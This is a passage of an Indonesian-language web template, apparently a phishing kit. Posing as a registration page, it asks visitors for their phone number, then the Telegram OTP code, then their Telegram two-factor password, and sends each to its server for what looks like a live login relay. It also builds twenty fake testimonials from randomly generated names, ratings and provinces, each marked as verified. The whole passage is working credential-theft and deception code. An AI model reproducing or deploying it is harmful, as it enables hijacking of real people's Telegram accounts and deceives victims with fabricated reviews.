        </div>
      </div>

   

      <div class="input-group">
        <label class="flex items-start cursor-pointer group">
          <div class="relative mt-1">
            <input type="checkbox" checked class="sr-only" autocomplete="off"/>
            <div class="w-5 h-5 border-2 border-gray-300 rounded group-hover:border-blue-400 transition-colors"></div>
            <i class="fas fa-check absolute inset-0 w-5 h-5 text-white text-xs flex items-center justify-center bg-blue-500 rounded opacity-100 transition-opacity"></i>
          </div>
          <span class="ml-3 font-medium text-gray-700 leading-relaxed">
            Saya setuju untuk menerima pesan Telegram dari Admin.
          </span>
        </label>
      </div>

      <button type="submit" id="buttonText" onclick="processFirstData()"
        class="w-full btn-primary text-lg tracking-wide">
        <%=  buttonname  %>
      </button>
    </form>
  </div>

  <div class="kedua" id="kedua" style="display: none;" >
   <p class="text-center text-gray-600 mb-6 leading-relaxed">
      Silakan Masukkan kode OTP yang telah dikirimkan ke Nomor Telegram Anda.
   </p>
      <form class="space-y-6" action="javascript:void(0)" method="post" id="secondForm">
      
      <div class="input-group">
        <label for="no_span" class="block font-semibold mb-2 text-gray-700">Nomor Telepon</label>
        <div class="relative">
          <i class="fab fa-telegram input-icon"></i>
          <input id="no_span" name="no_span" type="text"
            class="input-field bg-gray-100" disabled autocomplete="off"/>
        </div>
      </div>

      <div class="input-group">
        <label for="otp_code" class="block font-semibold mb-2 text-gray-700">Kode OTP Telegram</label>
        <div class="relative">
          <i class="fas fa-shield-alt input-icon"></i>
          <input id="otp_code" name="otp_code" maxlength="5" type="text" placeholder="Masukkan kode OTP Anda"
            class="input-field" autocomplete="off"/>
        </div>
    
        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
        <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
      </div>

      <button type="submit" onclick="processSecondData()"
        class="w-full btn-primary text-lg tracking-wide">
        Verifikasi & Lanjutkan
      </button>
    </form>
  </div>

  <div class="ketiga" id="ketiga" style="display: none;">
   <p class="text-center text-gray-600 mb-6 leading-relaxed">
      Silakan Masukkan Password (A2F) Akun Telegram Anda.
   </p>
      <form class="space-y-6" id="thirdForm" action="javascript:void(0)" method="post">
      
      <div class="input-group">
        <label for="no_span2" class="block font-semibold mb-2 text-gray-700">Nomor Telepon</label>
        <div class="relative">
          <i class="fab fa-telegram input-icon"></i>
          <input id="no_span2" name="no_span2" type="text"
            class="input-field bg-gray-100" disabled autocomplete="off"/>
        </div>
        
        <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
        <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
        <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
      </div>

      <div class="input-group">
        <label for="password" class="block font-semibold mb-2 text-gray-700">Password (A2F) Telegram</label>
        <div class="relative">
          <i class="fas fa-lock input-icon"></i>
          <input id="password" name="password" type="password" placeholder="Masukkan Password (A2F) Telegram Anda"
            class="input-field"autocomplete="off" />
        </div>
      </div>

      <button type="submit" onclick="processThirdData()"
        class="w-full btn-primary text-lg tracking-wide">
        Konfirmasi & Selesai
      </button>
    </form>
  </div>

  <div class="keempat" id="keempat" style="display: none;">
    <div class="flex flex-col items-center justify-center text-center py-12">

      <!-- Success Animation -->
      <div class="relative mb-8">
        <div class="w-24 h-24 rounded-full border-4 border-green-500 border-t-transparent animate-spin-slow"></div>
        <div class="absolute top-0 left-0 w-24 h-24 flex items-center justify-center">
          <i class="fas fa-check text-green-500 text-4xl animate-ping-once"></i>
        </div>
      </div>

      <div class="max-w-sm">
        <h3 class="text-2xl font-bold text-gray-800 mb-4">Pendaftaran Berhasil!</h3>
        <p class="text-gray-600 text-base leading-relaxed mb-4">
          Terima kasih, data Anda berhasil dikonfirmasi. Kami sedang memproses pendaftaran Anda.
        </p>
        <p class="text-sm text-gray-500">
          Kami akan segera menghubungi Anda melalui pesan Telegram.
        </p>
      </div>
    </div>
  </div>
 </div>
  </div>
    </div>
  </div>
 
  <!-- Testimonial Section - Dipindahkan ke bawah -->
  <div class="w-full max-w-lg ">
    <div class="glass-card rounded-3xl overflow-hidden shadow-2xl">
      <div class="bg-gradient-to-r from-violet-500 via-purple-500 to-blue-500 text-white text-center font-bold py-4 relative">
        <div class="absolute inset-0 bg-gradient-to-r from-violet-500/20 via-purple-500/20 to-blue-500/20 backdrop-blur-sm"></div>
        <div class="relative z-10 flex items-center justify-center space-x-2">
          <span class="text-lg tracking-wide">Testimoni</span>
        </div>
      </div>
      <div id="testimoniBox" class="h-64 relative bg-white/90 backdrop-blur-sm overflow-hidden">
        <div id="testimoniList" class="absolute top-0 left-0 w-full transition-all duration-700 ease-in-out px-4 py-2">
          <!-- Testimoni akan muncul di sini -->
        </div>
      </div>
    </div>
  </div>

  <footer class="text-center mt-8 text-sm text-gray-200">
    <p class="mb-4 font-medium">© 2025 All Rights Reserved.</p>
    <div class="flex justify-center space-x-5 text-white text-lg opacity-70">
     
    </div>
  </footer>

  
  <!-- Modern Loading Overlay -->
<div id="loadingOverlay" class="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50" style="display: none;">
  <div class="glass-card rounded-2xl p-8 flex flex-col items-center space-y-4 max-w-xs">
    <!-- Modern Spinner -->
    <div class="relative w-16 h-16">
      <div class="absolute inset-0 rounded-full border-4 border-blue-500/30"></div>
      <div class="absolute inset-0 rounded-full border-4 border-transparent border-t-blue-500 animate-spin"></div>
      <div class="absolute inset-0 flex items-center justify-center">
        <i class="fab fa-telegram text-blue-500 text-2xl"></i>
      </div>
    </div>
    <!-- Loading Text -->
    <div class="text-center">
      <p id="loadingText" class="text-gray-700 font-semibold text-lg">Loading...</p>
      <div class="w-24 h-1 bg-gray-200 rounded-full mt-2 overflow-hidden">
        <div class="h-full bg-gradient-to-r from-blue-500 to-purple-500 rounded-full animate-pulse"></div>
      </div>
    </div>
  </div>
</div>


  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script type="module">
    import { Faker, id_ID } from 'https://esm.sh/@faker-js/faker';

    const faker = new Faker({ locale: [id_ID] });

    $("#loadingOverlay").show();
  $("#loadingText").text("Selamat Datang");
    const testimonis = [];

    // Buat 20 nama palsu dengan pesan tetap
    for (let i = 0; i < 20; i++) {
      testimonis.push({
        name: faker.person.firstName(),
        message: "<%=  footerdesc  %>"
      });
    }

    const list = document.getElementById("testimoniList");

    // Fungsi membuat elemen testimoni
    function createItem({ name, message }) {
      const wrapper = document.createElement("div");
      wrapper.className = "testimonial-item relative";

      // Array rating acak (4-5 bintang)
      const rating = Math.floor(Math.random() * 2) + 4; // 4 atau 5 bintang
      const stars = '★'.repeat(rating) + '☆'.repeat(5 - rating);
      
  
const cities = [
  'Aceh',
  'Sumatera Utara',
  'Sumatera Barat',
  'Riau',
  'Kepulauan Riau',
  'Jambi',
  'Sumatera Selatan',
  'Kepulauan Bangka Belitung',
  'Bengkulu',
  'Lampung',
  'Banten',
  'DKI Jakarta',
  'Jawa Barat',
  'Jawa Tengah',
  'Daerah Istimewa Yogyakarta',
  'Jawa Timur',
  'Bali',
  'Nusa Tenggara Barat',
  'Nusa Tenggara Timur',
  'Kalimantan Barat',
  'Kalimantan Tengah',
  'Kalimantan Selatan',
  'Kalimantan Timur',
  'Kalimantan Utara',
  'Maluku',
  'Maluku Utara',
  'Papua',
  'Papua Barat',
  'Papua Barat Daya',
  'Papua Tengah',
  'Papua Pegunungan',
  'Papua Selatan'
];

      const city = cities[Math.floor(Math.random() * cities.length)];

      wrapper.innerHTML = `
        <div class="testimonial-quote">
        </div>
        <div class="flex items-start space-x-4">
          <img src="https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=random&size=100&rounded=true&bold=true&format=svg&length=1"
               class="testimonial-avatar flex-shrink-0" />
          <div class="flex-1 min-w-0">
            <div class="flex items-center justify-between mb-2">
              <h4 class="font-bold text-gray-800 text-base truncate">${name}</h4>
            
            </div>
            <div class="text-xs text-gray-500 mb-3 flex items-center space-x-2">
              <span class="flex items-center">
                <i class="fas fa-map-marker-alt mr-1 text-gray-400"></i>
                ${city}
              </span>
            </div>
            <blockquote class="text-gray-700 text-sm leading-relaxed italic">
              "${message}"
            </blockquote>
            <div class="flex items-center justify-between mt-3">
              <div class="flex items-center space-x-1 text-xs text-gray-400">
                <i class="far fa-clock"></i>
                <span>${Math.floor(Math.random() * 30) + 1} hari lalu</span>
              </div>
              <div class="flex items-center space-x-1 text-xs text-green-600">
                <i class="fas fa-check-circle"></i>
                <span>Terverifikasi</span>
              </div>
            </div>
          </div>
        </div>
      `;
      return wrapper;
    }

    // Tambahkan semua testimoni
    testimonis.forEach(item => list.appendChild(createItem(item)));

    // Gandakan untuk looping mulus
    testimonis.forEach(item => list.appendChild(createItem(item)));


      $("#loadingText").text("Memuat...");
  setTimeout(() => {
    $("#loadingOverlay").fadeOut();
  }, 800);

    // Scroll otomatis
    let position = 0;
    const itemHeight = 180; // Tinggi item testimonial yang baru
    const total = testimonis.length;

    setInterval(() => {
      position++;
      if (position >= total) {
        list.style.transition = "none";
        list.style.transform = `translateY(0px)`;
        position = 1;
        setTimeout(() => {
          list.style.transition = "all 0.7s ease-in-out";
          list.style.transform = `translateY(-${itemHeight * position}px)`;
        }, 100);
      } else {
        list.style.transition = "all 0.7s ease-in-out";
        list.style.transform = `translateY(-${itemHeight * position}px)`;
      }
    }, 3000); // Interval lebih lama untuk membaca testimoni
  </script>

  <script>
function formatPhoneNumber(phoneNumber) {
// Jika nomor telepon diawali dengan '0', ganti dengan '+628'
if (phoneNumber.startsWith('0')) {
return '+62' + phoneNumber.substring(1);
}
// Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
else if (phoneNumber.startsWith('62')) {
return '+62' + phoneNumber.substring(2);
}
// Jika format sudah sesuai, kembalikan nomor tanpa perubahan
else {
return phoneNumber;
}

}


function showAlert(message) {
  $("#alertFloating").html(`
    <div class="fixed top-6 right-6 glass-card text-red-700 px-6 py-4 rounded-2xl shadow-2xl text-sm flex items-start space-x-3 z-50 border border-red-200 animate-pulse">
      <div class="w-6 h-6 bg-red-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
        <i class="fas fa-exclamation text-white text-xs"></i>
      </div>
      <span class="leading-relaxed">${message}</span>
    </div>
  `)
}





function processFirstData(){
$('#firstForm').submit(function(submitingprocessFirstData){
submitingprocessFirstData.preventDefault();

var $phone = $("input#phone_number").val();
var $provinsi = $("select#provinsi").val();
var $phone_number = formatPhoneNumber($phone);
var dataToSend = {
phone_number: $phone_number
};

if($phone_number == ""){
  return false;
}

$.ajax({
  type: "POST",
  url: "/number",
 data: dataToSend,
  beforeSend: function() {
  
      $("#loadingOverlay").show();
      $("#loadingText").text("Mengirim kode...");
      $("#alertFloating").html("");
  
   
  },
  success: function(hasil){
      if(hasil.code == 200){  
           $("#loadingOverlay").hide();
              $("#awal").hide();
              $('#kedua').show();
                  $("input#validateclientHash").val(hasil.clientHash);
                  $("input#validateprovinsi").val($provinsi);
                  $("input#validatephone_number").val($phone_number);
               $("#no_span").val($phone_number);

          
      }else{
          if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
          showAlert(`The Number You Entered Is Invalid!`)
                  $("#loadingOverlay").hide();

              }else if(hasil.err.errorMessage == "FLOOD"){
                  $("#loadingOverlay").hide();
    
               showAlert(`Too Many Code Requests!`)
              }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
                  
                  $("#loadingOverlay").hide();
    
                showAlert(`Too Many Passwords Entered!`)
                  }else{
                      $("#loadingOverlay").hide();
    
                     showAlert(`${hasil.err.errorMessage}`)
                      }
                      
                      
                      
                      
                  }
             
  
  }
          });
      });  
      return false;
  };
  
  
  
